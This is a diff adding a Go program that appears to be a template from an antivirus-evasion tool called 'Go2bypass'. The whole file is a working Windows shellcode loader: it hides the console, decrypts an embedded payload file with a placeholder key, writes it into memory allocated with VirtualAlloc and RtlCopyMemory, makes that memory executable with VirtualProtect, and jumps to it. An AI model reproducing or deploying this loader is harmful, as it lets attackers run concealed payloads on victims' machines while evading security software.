@@ -1,0 +1,64 @@
+package main
+
+import (
+	Go2public "Go2bypass/Public"
+	_ "embed"
+	"fmt"
+	"log"
+	"os"
+	"syscall"
+	"unsafe"
+)
+
+//go:embed CodeToStringShell.txt
+var CodeToStringShell string
+
+const (
+	MEM_COMMIT        = 0x1000
+	MEM_RESERVE       = 0x2000
+	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE    = 0x04
+)
+
+var ApiDe Go2public.ApiEDcrypt
+var CodeEnContent Go2public.CodToshellKey
+
+func main() {
+	/******HideConsole******/
+	Go2public.Peels()
+    CodeEnContent.KeyKey = `/******KeyKey******/`
+	CodeEnContent.CodeToStringShell = CodeToStringShell
+	/******DecodeType******/
+	sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
+	if err != nil {
+		os.Exit(0)
+	}
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("%s", errVirtualAlloc.Error()))
+	}
+
+	if addr == 0 {
+		log.Fatal("")
+	}
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("%s", errRtlCopyMemory.Error()))
+	}
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("%s", errVirtualProtect.Error()))
+	}
+	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
+	if errSyscall != 0 {
+		log.Fatal(fmt.Sprintf("%s", errSyscall.Error()))
+	}
+}
